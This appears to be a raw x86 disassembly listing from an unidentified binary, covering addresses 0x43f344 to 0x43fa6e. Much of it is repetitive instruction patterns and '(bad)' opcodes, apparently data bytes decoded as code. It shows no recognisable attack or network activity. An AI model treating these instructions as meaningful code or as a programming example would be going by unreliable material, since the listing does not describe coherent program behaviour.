  43f344:	add    cl,ch
  43f346:	jbe    0x43f34a
  43f348:	add    cl,ch
  43f34a:	jbe    0x43f34e
  43f34c:	add    cl,ch
  43f34e:	jbe    0x43f352
  43f350:	add    cl,ch
  43f352:	jbe    0x43f356
  43f354:	add    cl,ch
  43f356:	jbe    0x43f35a
  43f358:	add    cl,ch
  43f35a:	jbe    0x43f35e
  43f35c:	add    cl,ch
  43f35e:	jbe    0x43f362
  43f360:	add    cl,ch
  43f362:	jbe    0x43f366
  43f364:	add    cl,ch
  43f366:	jbe    0x43f36a
  43f368:	add    cl,ch
  43f36a:	jbe    0x43f36e
  43f36c:	add    cl,ch
  43f36e:	jbe    0x43f372
  43f370:	add    cl,ch
  43f372:	add    BYTE PTR [eax],al
  43f374:	add    BYTE PTR [eax],al
  43f376:	add    BYTE PTR [esi+0x2],dh
  43f379:	add    cl,ch
  43f37b:	jbe    0x43f37f
  43f37d:	add    cl,ch
  43f37f:	jbe    0x43f383
  43f381:	add    cl,ch
  43f383:	jbe    0x43f387
  43f385:	add    cl,ch
  43f387:	jbe    0x43f38b
  43f389:	add    cl,ch
  43f38b:	jbe    0x43f38f
  43f38d:	add    cl,ch
  43f38f:	jbe    0x43f393
  43f391:	add    cl,ch
  43f393:	jbe    0x43f397
  43f395:	add    cl,ch
  43f397:	jbe    0x43f39b
  43f399:	add    BYTE PTR [eax],al
  43f39b:	sbb    al,0x1
  43f39d:	add    BYTE PTR [eax],al
  43f39f:	or     al,0x1
  43f3a1:	add    BYTE PTR [eax],al
  43f3a3:	or     al,0x1
  43f3a5:	add    BYTE PTR [eax],al
  43f3a7:	sbb    al,0x1
  43f3a9:	add    BYTE PTR [eax],al
  43f3ab:	sbb    al,0x1
  43f3ad:	add    BYTE PTR [eax],al
  43f3af:	or     al,0x1
  43f3b1:	add    BYTE PTR [eax],al
  43f3b3:	or     al,0x1
  43f3b5:	add    BYTE PTR [eax],al
  43f3b7:	fadd   QWORD PTR [eax]
  43f3b9:	add    BYTE PTR [eax],al
  43f3bb:	fadd   QWORD PTR [eax]
  43f3bd:	add    BYTE PTR [eax],al
  43f3bf:	int3   
  43f3c0:	add    BYTE PTR [eax],al
  43f3c2:	add    ah,cl
  43f3c4:	add    BYTE PTR [eax],al
  43f3c6:	add    ah,bl
  43f3c8:	add    BYTE PTR [eax],al
  43f3ca:	add    ah,bl
  43f3cc:	add    BYTE PTR [eax],al
  43f3ce:	add    ah,cl
  43f3d0:	add    BYTE PTR [eax],al
  43f3d2:	add    ah,cl
  43f3d4:	add    BYTE PTR [eax],al
  43f3d6:	add    BYTE PTR [eax+eax*1+0x0],bl
  43f3dd:	add    BYTE PTR [eax],al
  43f3df:	add    BYTE PTR [eax+eax*1+0x8c0000],bl
  43f3e6:	add    BYTE PTR [eax],al
  43f3e8:	mov    WORD PTR [eax],es
  43f3ea:	add    BYTE PTR [eax],al
  43f3ec:	pushf  
  43f3ed:	add    BYTE PTR [eax],al
  43f3ef:	add    BYTE PTR [eax+eax*1+0x8c0000],bl
  43f3f6:	add    BYTE PTR [eax],al
  43f3f8:	mov    WORD PTR [eax],es
  43f3fa:	add    BYTE PTR [eax],al
  43f3fc:	pop    esp
  43f3fd:	add    BYTE PTR [eax],al
  43f3ff:	add    BYTE PTR [eax+eax*1+0x0],bl
  43f403:	add    BYTE PTR [eax+eax*1+0x0],cl
  43f407:	add    BYTE PTR [eax+eax*1+0x0],cl
  43f40b:	add    BYTE PTR [eax+eax*1+0x0],bl
  43f40f:	add    BYTE PTR [eax+eax*1+0x0],bl
  43f413:	add    BYTE PTR [eax+eax*1+0x0],cl
  43f417:	add    BYTE PTR [ebp-0x57],dh
  43f41a:	cld    
  43f41b:	push   DWORD PTR [ebp-0x57]
  43f41e:	cld    
  43f41f:	push   DWORD PTR [ebp-0x57]
  43f422:	cld    
  43f423:	push   DWORD PTR [ebp-0x57]
  43f426:	cld    
  43f427:	push   DWORD PTR [ebp-0x57]
  43f42a:	cld    
  43f42b:	push   DWORD PTR [ebp-0x57]
  43f42e:	cld    
  43f42f:	push   DWORD PTR [ebp-0x57]
  43f432:	cld    
  43f433:	push   DWORD PTR [ebp-0x57]
  43f436:	cld    
  43f437:	push   DWORD PTR [ebp-0x57]
  43f43a:	cld    
  43f43b:	push   DWORD PTR [ebp-0x57]
  43f43e:	cld    
  43f43f:	push   DWORD PTR [ebp-0x57]
  43f442:	cld    
  43f443:	inc    DWORD PTR [eax]
  43f445:	add    BYTE PTR [eax],al
  43f447:	add    BYTE PTR [eax],al
  43f449:	jne    0x43f3f4
  43f44b:	cld    
  43f44c:	push   DWORD PTR [ebp-0x57]
  43f44f:	cld    
  43f450:	push   DWORD PTR [ebp-0x57]
  43f453:	cld    
  43f454:	push   DWORD PTR [ebp-0x57]
  43f457:	cld    
  43f458:	push   DWORD PTR [ebp-0x57]
  43f45b:	cld    
  43f45c:	push   DWORD PTR [ebp-0x57]
  43f45f:	cld    
  43f460:	push   DWORD PTR [ebp-0x57]
  43f463:	cld    
  43f464:	push   DWORD PTR [ebp-0x57]
  43f467:	cld    
  43f468:	push   DWORD PTR [ebp-0x57]
  43f46b:	cld    
  43f46c:	push   DWORD PTR [ebp-0x57]
  43f46f:	cld    
  43f470:	push   DWORD PTR [ebp-0x57]
  43f473:	cld    
  43f474:	push   DWORD PTR [ebp-0x57]
  43f477:	cld    
  43f478:	push   DWORD PTR [ebp-0x57]
  43f47b:	cld    
  43f47c:	push   DWORD PTR [ebp-0x57]
  43f47f:	cld    
  43f480:	push   DWORD PTR [ebp-0x57]
  43f483:	cld    
  43f484:	push   DWORD PTR [ebp-0x57]
  43f487:	cld    
  43f488:	push   DWORD PTR [ebp-0x57]
  43f48b:	cld    
  43f48c:	push   DWORD PTR [ebp-0x57]
  43f48f:	cld    
  43f490:	push   DWORD PTR [ebp-0x57]
  43f493:	cld    
  43f494:	push   DWORD PTR [ebp+0x2]
  43f497:	out    0x3,eax
  43f499:	jne    0x43f49d
  43f49b:	out    0x3,eax
  43f49d:	jne    0x43f4a1
  43f49f:	out    0x3,eax
  43f4a1:	jne    0x43f4a5
  43f4a3:	out    0x3,eax
  43f4a5:	jne    0x43f4a9
  43f4a7:	out    0x3,eax
  43f4a9:	jne    0x43f4ad
  43f4ab:	out    0x3,eax
  43f4ad:	add    BYTE PTR [eax],al
  43f4af:	add    BYTE PTR [eax],al
  43f4b1:	add    BYTE PTR [ebp+0x2],dh
  43f4b4:	out    0x3,eax
  43f4b6:	jne    0x43f4ba
  43f4b8:	out    0x3,eax
  43f4ba:	jne    0x43f4be
  43f4bc:	out    0x3,eax
  43f4be:	jne    0x43f4c2
  43f4c0:	out    0x3,eax
  43f4c2:	jne    0x43f4c6
  43f4c4:	(bad)  
  43f4c5:	aas    
  43f4c6:	xor    eax,0x35416f02
  43f4cb:	add    ch,al
  43f4cd:	add    dh,BYTE PTR [ebp+0x2]
  43f4d0:	fld    DWORD PTR [edx]
  43f4d2:	jne    0x43f4d6
  43f4d4:	loop   0x43f4d9
  43f4d6:	jne    0x43f4da
  43f4d8:	jg     0x43f515
  43f4da:	xor    eax,0x35470702
  43f4df:	add    ah,bh
  43f4e1:	add    esi,DWORD PTR [ebp+0x2]
  43f4e4:	icebp  
  43f4e5:	add    esi,DWORD PTR [ebp+0x2]
  43f4e8:	fiadd  DWORD PTR [ebx]
  43f4ea:	jne    0x43f4ee
  43f4ec:	out    0x3,eax
  43f4ee:	jne    0x43f4f2
  43f4f0:	pop    edi
  43f4f1:	inc    edi
  43f4f2:	xor    eax,0x7503e702
  43f4f7:	add    dl,dh
  43f4f9:	add    esi,DWORD PTR [ebp+0x2]
  43f4fc:	jmp    0x7503:0xe7027503
  43f503:	add    ch,al
  43f505:	add    esi,DWORD PTR [ebp+0x2]
  43f508:	sbb    DWORD PTR [edx-0x2c8b256],ebp
  43f50e:	sbb    eax,0x7503e747
  43f513:	add    al,BYTE PTR [eax]
  43f515:	leave  
  43f516:	add    BYTE PTR [eax],al
  43f518:	add    BYTE PTR [eax],al
  43f51a:	add    BYTE PTR [ebp+0x7f],bh
  43f51d:	push   ss
  43f51e:	jmp    0xe943f799
  43f523:	jbe    0x43f527
  43f525:	add    cl,ch
  43f527:	jbe    0x43f52b
  43f529:	add    cl,ch
  43f52b:	jp     0x43f52f
  43f52d:	add    al,ch
  43f52f:	or     cl,BYTE PTR [ebx+0x276fcf8]
  43f535:	add    dl,dh
  43f537:	jbe    0x43f53b
  43f539:	add    BYTE PTR [ecx+0x2e000276],ch
  43f53f:	jb     0x43f543
  43f541:	add    BYTE PTR [ecx+0x79],ch
  43f544:	add    al,BYTE PTR [eax]
  43f546:	push   0xf1f88ad6
  43f54b:	jbe    0x43f54f
  43f54d:	add    cl,ah
  43f54f:	jbe    0x43f553
  43f551:	add    cl,cl
  43f553:	jbe    0x43f557
  43f555:	add    BYTE PTR [esi+0x76],bh
  43f558:	add    al,BYTE PTR [eax]
  43f55a:	jmp    0xe943f7d5
  43f55f:	jbe    0x43f563
  43f561:	add    cl,ch
  43f563:	push   esi
  43f564:	(bad)  
  43f565:	cmp    cl,ch
  43f567:	jbe    0x43f56b
  43f569:	add    cl,ch
  43f56b:	jbe    0x43f56f
  43f56d:	add    cl,ch
  43f56f:	mov    esi,0x76e94004
  43f574:	add    al,BYTE PTR [eax]
  43f576:	jmp    0xe943f7f1
  43f57b:	lock or DWORD PTR [eax-0x17],eax
  43f57f:	add    BYTE PTR [eax],al
  43f581:	add    BYTE PTR [eax],al
  43f583:	add    BYTE PTR [esi+0x2],dh
  43f586:	add    cl,ch
  43f588:	jbe    0x43f58c
  43f58a:	add    BYTE PTR [ecx],ch
  43f58c:	cmc    
  43f58d:	std    
  43f58e:	aas    
  43f58f:	jmp    0xe943f80a
  43f594:	jbe    0x43f598
  43f596:	add    BYTE PTR [eax],al
  43f598:	jl     0x43f563
  43f59a:	pop    es
  43f59b:	inc    eax
  43f59c:	dec    esp
  43f59d:	add    eax,0x55c0000
  43f5a2:	add    BYTE PTR [eax],al
  43f5a4:	xor    BYTE PTR [ecx+0xa],bh
  43f5a7:	inc    eax
  43f5a8:	dec    esp
  43f5a9:	add    eax,0x54c0000
  43f5ae:	add    BYTE PTR [eax+0x400f0db2],al
  43f5b4:	sbb    al,0x5
  43f5b6:	add    BYTE PTR [eax],al
  43f5b8:	or     al,0x5
  43f5ba:	add    BYTE PTR [eax],ah
  43f5bc:	cwde   
  43f5bd:	and    edx,DWORD PTR [edx]
  43f5bf:	inc    eax
  43f5c0:	sbb    al,0x5
  43f5c2:	add    BYTE PTR [eax],al
  43f5c4:	sbb    al,0x9
  43f5c6:	mov    bh,0xc9
  43f5c8:	ja     0x43f63e
  43f5ca:	sub    al,0x40
  43f5cc:	or     al,0x5
  43f5ce:	add    BYTE PTR [ecx+0x1bc6c179],ah
  43f5d4:	sahf   
  43f5d5:	pop    eax
  43f5d6:	inc    esi
  43f5d7:	inc    eax
  43f5d8:	lods   al,BYTE PTR ds:[esi]
  43f5d9:	je     0x43f571
  43f5db:	mov    ch,0x5c
  43f5dd:	mov    al,ds:0x82a1ada0
  43f5e2:	popa   
  43f5e3:	inc    eax
  43f5e4:	ins    BYTE PTR es:[edi],dx
  43f5e5:	inc    edx
  43f5e6:	cmc    
  43f5e7:	and    eax,0x0
  43f5ec:	add    BYTE PTR [ecx+0x754f868f],dh
  43f5f2:	pop    edi
  43f5f3:	jnp    0x43f635
  43f5f5:	dec    ebp
  43f5f6:	or     al,0xd0
  43f5f8:	xchg   ebp,eax
  43f5f9:	pop    edi
  43f5fa:	hlt    
  43f5fb:	cld    
  43f5fc:	mov    WORD PTR [ebp-0x4abf68ed],es
  43f602:	and    bl,BYTE PTR [ecx+0xa84b944]
  43f608:	(bad)  
  43f609:	sbb    eax,0x1b40b188
  43f60e:	mov    ds:0x62cba6cd,al
  43f613:	inc    ecx
  43f614:	pop    ds
  43f615:	jne    0x43f608
  43f617:	ror    esp,0xb5
  43f61a:	nop
  43f61b:	(bad)  
  43f61c:	fcomip st,st(1)
  43f61e:	jb     0x43f5a3
  43f620:	(bad)  
  43f621:	mov    dl,0x43
  43f623:	jae    0x43f5cc
  43f625:	mov    ah,0xd5
  43f627:	and    BYTE PTR [eax+eiz*4-0x38],0xd5
  43f62c:	mov    cl,BYTE PTR [edx-0x56]
  43f62f:	pushf  
  43f630:	jnp    0x43f5e9
  43f632:	ins    DWORD PTR es:[edi],dx
  43f633:	mov    eax,0x79335389
  43f638:	hlt    
  43f639:	push   ds
  43f63a:	shr    BYTE PTR [edx+0x4e],0xb6
  43f63e:	jp     0x43f5e5
  43f640:	jno    0x43f658
  43f642:	ficom  WORD PTR [ecx+0x7d1d6226]
  43f648:	and    DWORD PTR [ecx-0x30ef0bff],esi
  43f64e:	loope  0x43f6bd
  43f650:	sldt   WORD PTR [eax]
  43f653:	add    BYTE PTR [eax],al
  43f655:	add    BYTE PTR [esi],dl
  43f657:	out    0xc7,eax
  43f659:	cmc    
  43f65a:	cmp    DWORD PTR [edi+eiz*2],eax
  43f65d:	shl    esi,cl
  43f65f:	clc    
  43f660:	stos   BYTE PTR es:[edi],al
  43f661:	fisubr WORD PTR [edi]
  43f663:	xor    DWORD PTR [ecx-0x38],0x30
  43f667:	xchg   al,cl
  43f669:	shl    ah,0xa7
  43f66c:	test   ax,0xb315
  43f670:	mov    ds:0x21963b9c,eax
  43f675:	adc    DWORD PTR [ecx+0x36],ebp
  43f678:	jge    0x43f5fb
  43f67a:	sub    BYTE PTR [edi],ch
  43f67c:	lds    eax,FWORD PTR [edi+0x38]
  43f67f:	rol    DWORD PTR [ecx-0x1c],1
  43f682:	fisubr DWORD PTR [esi+edx*8]
  43f685:	xor    al,0x60
  43f687:	adc    DWORD PTR [edx-0x16],0xe266e626
  43f68e:	sub    BYTE PTR [esi+0x23e5ac1],bl
  43f694:	outs   dx,BYTE PTR ds:[esi]
  43f695:	sub    eax,0x173e9a2c
  43f69b:	xchg   edx,eax
  43f69c:	inc    edi
  43f69d:	jecxz  0x43f6c9
  43f69f:	ss inc esp
  43f6a1:	(bad)  
  43f6a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f6a3:	and    DWORD PTR [eax+0x6e2bf19e],ebx
  43f6a9:	mov    ebx,0x9a602d97
  43f6ae:	and    DWORD PTR [edi],esp
  43f6b0:	cmp    eax,0x9934a76
  43f6b5:	popa   
  43f6b6:	fdivr  DWORD PTR [ecx+0xbebb]
  43f6bc:	add    BYTE PTR [eax],al
  43f6be:	add    BYTE PTR [edx+0x1caa320],dh
  43f6c4:	ja     0x43f6cc
  43f6c6:	mov    fs,WORD PTR [eax]
  43f6c8:	xor    edi,eax
  43f6ca:	(bad)  
  43f6cb:	push   edi
  43f6cc:	adc    eax,0x27503e7
  43f6d1:	and    al,0xcf
  43f6d3:	aas    
  43f6d4:	mov    esi,0xbe2ecf1a
  43f6d9:	xor    cl,bh
  43f6db:	add    edi,ecx
  43f6dd:	xchg   edi,eax
  43f6de:	fidivr WORD PTR [eax-0x49]
  43f6e1:	inc    ebp
  43f6e2:	adc    ebp,DWORD PTR [esi-0x159bce04]
  43f6e8:	into   
  43f6e9:	pushf  
  43f6ea:	daa    
  43f6eb:	mov    al,ds:0xe58ea9af
  43f6f0:	pop    ds
  43f6f1:	aad    0x84
  43f6f3:	(bad)  
  43f6f4:	into   
  43f6f5:	and    eax,0x258eb4
  43f6fa:	mov    ds:0xb591f722,al
  43f6ff:	mov    ds:0x880fb6ce,eax
  43f704:	xchg   BYTE PTR [ecx],ah
  43f706:	sti    
  43f707:	xor    eax,0x8c67ab5e
  43f70c:	into   
  43f70d:	les    bx,DWORD PTR es:[eax]
  43f711:	add    BYTE PTR [ebp+0x1a],al
  43f714:	add    al,0xbb
  43f716:	idiv   al
  43f718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f719:	cmp    dl,bl
  43f71b:	xchg   ebp,eax
  43f71c:	dec    edx
  43f71d:	cmp    eax,0x93b11c23
  43f722:	push   esi
  43f723:	add    BYTE PTR [eax],al
  43f725:	add    BYTE PTR [eax],al
  43f727:	add    BYTE PTR [ebx],ah
  43f729:	mov    ds:0x8914ab38,eax
  43f72e:	leave  
  43f72f:	or     ch,ch
  43f731:	cld    
  43f732:	jo     0x43f6e1
  43f734:	fisub  WORD PTR [ecx+0x37bac638]
  43f73a:	fistp  WORD PTR [ebp*1+0x137c934c]
  43f741:	lds    edi,FWORD PTR [eax]
  43f743:	jnp    0x43f782
  43f745:	aas    
  43f746:	xor    eax,0x13b9b2dc
  43f74b:	(bad)  
  43f74c:	lahf   
  43f74d:	pop    edx
  43f74e:	cmp    BYTE PTR [edi],ah
  43f750:	push   edx
  43f751:	push   esp
  43f752:	xchg   ebx,eax
  43f753:	add    BYTE PTR [ecx+ebx*2+0x723a7819],bh
  43f75a:	cmp    BYTE PTR ds:0x65ddc416,al
  43f760:	lahf   
  43f761:	(bad)  
  43f762:	cs mov bh,bh
  43f765:	pop    ss
  43f766:	cmp    DWORD PTR [eax-0x7040ca53],ecx
  43f76c:	dec    ecx
  43f76d:	ds jl  0x43f74b
  43f770:	aas    
  43f771:	sub    bh,BYTE PTR [ecx]
  43f773:	push   ss
  43f774:	and    ebx,ebx
  43f776:	mov    ch,bh
  43f778:	sub    BYTE PTR [edi-0x7e],bh
  43f77b:	aam    0xdf
  43f77d:	inc    ecx
  43f77e:	cmp    DWORD PTR ds:0x20e6609a,ecx
  43f784:	sbb    al,0xe2
  43f786:	in     eax,0x56
  43f788:	sbb    edi,esp
  43f78a:	cmp    BYTE PTR [eax+eax*1+0x0],cl
  43f78e:	add    BYTE PTR [eax],al
  43f790:	add    BYTE PTR ds:0xf000e36c,ah
  43f796:	in     eax,0x7b
  43f798:	inc    esi
  43f799:	in     al,dx
  43f79a:	ret    0x3e4d
  43f79d:	aas    
  43f79e:	jmp    0xcab3c3a0
  43f7a3:	outs   dx,BYTE PTR ds:[esi]
  43f7a4:	adc    ebx,0x16
  43f7a7:	jp     0x43f7e6
  43f7a9:	in     eax,dx
  43f7aa:	imul   esi,DWORD PTR [edx],0x19
  43f7ad:	xchg   cl,ah
  43f7af:	sbb    al,0x43
  43f7b1:	cmp    eax,0x2d3ca4c1
  43f7b6:	jle    0x43f781
  43f7b8:	cmp    dh,bl
  43f7ba:	inc    esp
  43f7bb:	(bad)  
  43f7bc:	mov    eax,0x3bcf625c
  43f7c1:	lock js 0x43f814
  43f7c4:	or     BYTE PTR [edi+0x37],dh
  43f7c7:	loope  0x43f7ac
  43f7c9:	call   0x3d85:0x5a3afc27
  43f7d0:	inc    edx
  43f7d1:	sbb    esi,DWORD PTR [edi]
  43f7d3:	xchg   edx,eax
  43f7d4:	jne    0x43f7f1
  43f7d6:	dec    eax
  43f7d7:	cmp    cl,BYTE PTR es:[edi]
  43f7da:	neg    BYTE PTR [ebx]
  43f7dc:	sar    BYTE PTR [edi+0x49],cl
  43f7df:	sub    ch,dh
  43f7e1:	aad    0x10
  43f7e3:	push   ebx
  43f7e4:	cmp    DWORD PTR [edx+0x2bc0b684],ebp
  43f7ea:	dec    ebx
  43f7eb:	popf   
  43f7ec:	cmp    BYTE PTR [edx],0x23
  43f7ef:	scas   al,BYTE PTR es:[edi]
  43f7f0:	xor    ch,BYTE PTR [esi-0x27]
  43f7f3:	test   eax,0x11
  43f7f8:	add    BYTE PTR [eax],al
  43f7fa:	sub    edx,ebx
  43f7fc:	xchg   esi,eax
  43f7fd:	inc    esp
  43f7fe:	adc    eax,0xb92c0934
  43f803:	cmp    eax,0xb50a2de4
  43f808:	inc    edi
  43f809:	push   ebx
  43f80a:	loop   0x43f7c7
  43f80c:	arpl   WORD PTR ds:0xa403c923,sp
  43f812:	jne    0x43f86f
  43f814:	mov    ecx,0xabb020bd
  43f819:	sar    DWORD PTR [ebx+0x25],0xa3
  43f81d:	xchg   DWORD PTR [edi],ebp
  43f81f:	hlt    
  43f820:	ins    BYTE PTR es:[edi],dx
  43f821:	cmp    ecx,edx
  43f823:	jmp    0x6346:0xed5d1d7e
  43f82a:	pop    ss
  43f82b:	data16 jle 0x43f7b6
  43f82e:	and    ah,BYTE PTR [eax+esi*2-0x17827b86]
  43f835:	fld    DWORD PTR [edx]
  43f837:	ins    BYTE PTR es:[edi],dx
  43f838:	lods   eax,DWORD PTR ds:[esi]
  43f839:	(bad)  
  43f83a:	jno    0x43f8a2
  43f83c:	popa   
  43f83d:	xlat   BYTE PTR ds:[ebx]
  43f83e:	jg     0x43f7d9
  43f840:	cld    
  43f841:	push   DWORD PTR [ebp+0x35]
  43f844:	mov    bh,BYTE PTR [edi]
  43f846:	jne    0x43f849
  43f848:	adc    DWORD PTR [eax+0x75],eax
  43f84b:	or     eax,0xb9753f8a
  43f850:	adc    DWORD PTR [eax+0x75],eax
  43f853:	or     DWORD PTR [edx-0x75de8ac1],ecx
  43f859:	aas    
  43f85a:	jne    0x43f875
  43f85c:	mov    bh,BYTE PTR [edi]
  43f85e:	add    BYTE PTR [eax],al
  43f860:	add    BYTE PTR [eax],al
  43f862:	add    BYTE PTR [ebp-0x3f],dh
  43f865:	mov    bh,BYTE PTR [edi]
  43f867:	jne    0x43f8b2
  43f869:	mov    bh,BYTE PTR [edi]
  43f86b:	jne    0x43f82e
  43f86d:	mov    bh,BYTE PTR [edi]
  43f86f:	jne    0x43f8ea
  43f871:	mov    bh,BYTE PTR [edi]
  43f873:	jne    0x43f836
  43f875:	mov    bh,BYTE PTR [edi]
  43f877:	jne    0x43f8de
  43f879:	mov    bh,BYTE PTR [edi]
  43f87b:	jne    0x43f8d6
  43f87d:	mov    bh,BYTE PTR [edi]
  43f87f:	jne    0x43f842
  43f881:	mov    bh,BYTE PTR [edi]
  43f883:	jne    0x43f8ce
  43f885:	mov    bh,BYTE PTR [edi]
  43f887:	jne    0x43f84a
  43f889:	mov    bh,BYTE PTR [edi]
  43f88b:	jne    0x43f84a
  43f88d:	mov    bh,BYTE PTR [edi]
  43f88f:	jne    0x43f893
  43f891:	test   DWORD PTR [ebp-0x7210fd8e],0x8ed3026a
  43f89b:	bound  eax,QWORD PTR [edx]
  43f89d:	ror    DWORD PTR [esi-0x7130fda6],cl
  43f8a3:	push   edx
  43f8a4:	add    bl,BYTE PTR [ebx-0x64fdb572]
  43f8aa:	mov    es,WORD PTR [edx+0x2]
  43f8ad:	fwait
  43f8ae:	mov    ?,WORD PTR [edx]
  43f8b0:	add    cl,BYTE PTR [esi]
  43f8b2:	scas   al,BYTE PTR es:[edi]
  43f8b3:	mov    bl,0x2
  43f8b5:	adc    eax,0xe702abae
  43f8ba:	add    esi,DWORD PTR [ebp+0x2]
  43f8bd:	out    0x3,eax
  43f8bf:	jne    0x43f8c3
  43f8c1:	out    0x3,eax
  43f8c3:	jne    0x43f8c7
  43f8c5:	out    0x3,eax
  43f8c7:	add    BYTE PTR [eax],al
  43f8c9:	add    BYTE PTR [eax],al
  43f8cb:	add    BYTE PTR [ebp+0x2],dh
  43f8ce:	out    0x3,eax
  43f8d0:	jne    0x43f8d4
  43f8d2:	mov    ecx,0xe702786c
  43f8d7:	add    esi,DWORD PTR [ebp+0x2]
  43f8da:	out    0x3,eax
  43f8dc:	jne    0x43f8e0
  43f8de:	out    0x3,eax
  43f8e0:	jne    0x43f8e4
  43f8e2:	push   es
  43f8e3:	and    DWORD PTR [edx+0x2],ebx
  43f8e6:	out    0x3,eax
  43f8e8:	jne    0x43f8ec
  43f8ea:	out    0x3,eax
  43f8ec:	jne    0x43f8f0
  43f8ee:	out    0x3,eax
  43f8f0:	jne    0x43f8f4
  43f8f2:	lods   eax,DWORD PTR ds:[esi]
  43f8f3:	and    BYTE PTR [edx],bh
  43f8f5:	add    ah,bh
  43f8f7:	add    esi,DWORD PTR [ebp+0x2]
  43f8fa:	out    0x3,eax
  43f8fc:	jne    0x43f900
  43f8fe:	out    0x3,eax
  43f900:	jne    0x43f904
  43f902:	cmp    BYTE PTR [eax],ah
  43f904:	call   0xe702:0x7503e702
  43f90b:	add    esi,DWORD PTR [ebp+0x2]
  43f90e:	add    cl,ch
  43f910:	jbe    0x43f914
  43f912:	add    BYTE PTR [edi-0x6e],dh
  43f915:	retf   
  43f916:	(bad)  
  43f917:	call   0xe943fb92
  43f91c:	jbe    0x43f920
  43f91e:	add    cl,ch
  43f920:	jbe    0x43f924
  43f922:	add    dl,dh
  43f924:	push   ebp
  43f925:	retf   
  43f926:	(bad)  
  43f927:	call   0xe943fba2
  43f92c:	jbe    0x43f930
  43f92e:	add    cl,ch
  43f930:	add    BYTE PTR [eax],al
  43f932:	add    BYTE PTR [eax],al
  43f934:	add    BYTE PTR [esi+0x2],dh
  43f937:	add    BYTE PTR [edi],cl
  43f939:	push   esp
  43f93a:	retf   
  43f93b:	(bad)  
  43f93c:	call   0xe943fbb7
  43f941:	jbe    0x43f945
  43f943:	add    cl,ch
  43f945:	jbe    0x43f949
  43f947:	add    BYTE PTR [edi-0x6c],ch
  43f94a:	leave  
  43f94b:	(bad)  
  43f94c:	call   0xe943fbc7
  43f951:	jbe    0x43f955
  43f953:	add    cl,ch
  43f955:	jbe    0x43f959
  43f957:	add    BYTE PTR [ebp-0x6c],bh
  43f95a:	leave  
  43f95b:	(bad)  
  43f95c:	call   0xe943fbd7
  43f961:	jbe    0x43f965
  43f963:	add    cl,ch
  43f965:	jbe    0x43f969
  43f967:	add    ch,ch
  43f969:	push   esp
  43f96a:	leave  
  43f96b:	(bad)  
  43f96c:	call   0xe943fbe7
  43f971:	jbe    0x43f975
  43f973:	add    cl,ch
  43f975:	jbe    0x43f979
  43f977:	add    BYTE PTR [eax-0x170036ac],bh
  43f97d:	jbe    0x43f981
  43f97f:	add    cl,ch
  43f981:	jbe    0x43f985
  43f983:	add    cl,ch
  43f985:	jbe    0x43f989
  43f987:	add    BYTE PTR [eax-0x69],ah
  43f98a:	leave  
  43f98b:	(bad)  
  43f98c:	(bad)  
  43f98d:	fadd   QWORD PTR ds:0x5dc0000
  43f993:	add    BYTE PTR [eax],al
  43f995:	int3   
  43f996:	add    eax,0x0
  43f99b:	add    BYTE PTR [eax],al
  43f99d:	add    BYTE PTR ds:0x9c0038e4,ch
  43f9a3:	add    eax,0x59c0000
  43f9a8:	add    BYTE PTR [eax],al
  43f9aa:	mov    WORD PTR ds:0x19330000,es
  43f9b0:	cmp    eax,DWORD PTR [eax]
  43f9b2:	pushf  
  43f9b3:	add    eax,0x59c0000
  43f9b8:	add    BYTE PTR [eax],al
  43f9ba:	mov    WORD PTR ds:0x18050000,es
  43f9c0:	cmp    eax,DWORD PTR [eax]
  43f9c2:	pop    esp
  43f9c3:	add    eax,0x55c0000
  43f9c8:	add    BYTE PTR [eax],al
  43f9ca:	dec    esp
  43f9cb:	add    eax,0x17ff0000
  43f9d0:	cmp    eax,DWORD PTR [eax]
  43f9d2:	pop    esp
  43f9d3:	add    eax,0x55c0000
  43f9d8:	add    BYTE PTR [eax],al
  43f9da:	dec    esp
  43f9db:	add    eax,0x1a710000
  43f9e0:	cmp    eax,DWORD PTR [eax]
  43f9e2:	sbb    al,0x5
  43f9e4:	add    BYTE PTR [eax],al
  43f9e6:	sbb    al,0x5
  43f9e8:	add    BYTE PTR [eax],al
  43f9ea:	or     al,0x5
  43f9ec:	add    BYTE PTR [eax],al
  43f9ee:	cdq    
  43f9ef:	and    DWORD PTR [ebx],edi
  43f9f1:	add    BYTE PTR [eax*1+0x51c0000],bl
  43f9f8:	add    BYTE PTR [eax],al
  43f9fa:	or     al,0x5
  43f9fc:	add    BYTE PTR [eax],al
  43f9fe:	mov    bl,0x6c
  43fa00:	cmp    BYTE PTR [eax],al
  43fa02:	add    BYTE PTR [eax],al
  43fa04:	add    BYTE PTR [eax],al
  43fa06:	add    ah,bl
  43fa08:	add    al,0x0
  43fa0a:	add    ah,bl
  43fa0c:	add    al,0x0
  43fa0e:	add    BYTE PTR [ebp-0x65],dh
  43fa11:	cld    
  43fa12:	push   DWORD PTR [ebp-0x50]
  43fa15:	cld    
  43fa16:	ds jne 0x43f9b4
  43fa19:	cld    
  43fa1a:	push   DWORD PTR [ebp-0x65]
  43fa1d:	cld    
  43fa1e:	push   DWORD PTR [ebp-0x65]
  43fa21:	cld    
  43fa22:	push   DWORD PTR [ebp+0x6e]
  43fa25:	cld    
  43fa26:	ds jne 0x43f9c4
  43fa29:	cld    
  43fa2a:	push   DWORD PTR [ebp-0x65]
  43fa2d:	cld    
  43fa2e:	push   DWORD PTR [ebp-0x65]
  43fa31:	cld    
  43fa32:	push   DWORD PTR [ebp+0x14]
  43fa35:	add    al,0x3f
  43fa37:	jne    0x43f9d4
  43fa39:	cld    
  43fa3a:	push   DWORD PTR [ebp-0x65]
  43fa3d:	cld    
  43fa3e:	push   DWORD PTR [ebp-0x65]
  43fa41:	cld    
  43fa42:	push   DWORD PTR [ebp-0x46]
  43fa45:	add    edi,DWORD PTR [edi]
  43fa47:	jne    0x43f9e2
  43fa49:	cld    
  43fa4a:	push   DWORD PTR [ebp-0x67]
  43fa4d:	cld    
  43fa4e:	push   DWORD PTR [ebp-0x67]
  43fa51:	cld    
  43fa52:	push   DWORD PTR [ebp-0x40]
  43fa55:	std    
  43fa56:	ds jne 0x43f9f2
  43fa59:	cld    
  43fa5a:	push   DWORD PTR [ebp-0x67]
  43fa5d:	cld    
  43fa5e:	push   DWORD PTR [ebp-0x67]
  43fa61:	cld    
  43fa62:	push   DWORD PTR [ebp-0x7a]
  43fa65:	std    
  43fa66:	ds jne 0x43fa02
  43fa69:	cld    
  43fa6a:	inc    DWORD PTR [eax]
  43fa6c:	add    BYTE PTR [eax],al
  43fa6e:	add    BYTE PTR [eax],al
